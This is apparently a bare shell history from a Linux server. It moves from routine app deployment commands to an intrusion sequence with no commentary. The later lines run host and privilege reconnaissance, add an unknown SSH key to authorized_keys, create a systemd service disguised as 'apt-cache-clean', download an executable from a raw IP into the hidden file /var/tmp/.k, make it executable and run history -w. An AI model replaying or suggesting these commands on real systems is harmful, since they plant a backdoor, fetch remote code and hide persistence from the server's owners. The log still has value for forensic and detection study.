make deploy
cd app
git pull
systemctl status app
tail -f /var/log/app/app.log
ls
sudo systemctl restart app
id
uname -a
w
cat /etc/passwd
ls -la
ps aux
sudo -l
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHRyyA7u98zTZHK44YnQNNaxyWzGSI3PivMGvP22YFmo k' >> ~/.ssh/authorized_keys
sudo tee -a /etc/systemd/system/apt-cache-clean.service
wget -q http://45.109.93.10/k -O /var/tmp/.k
chmod +x /var/tmp/.k
history -w
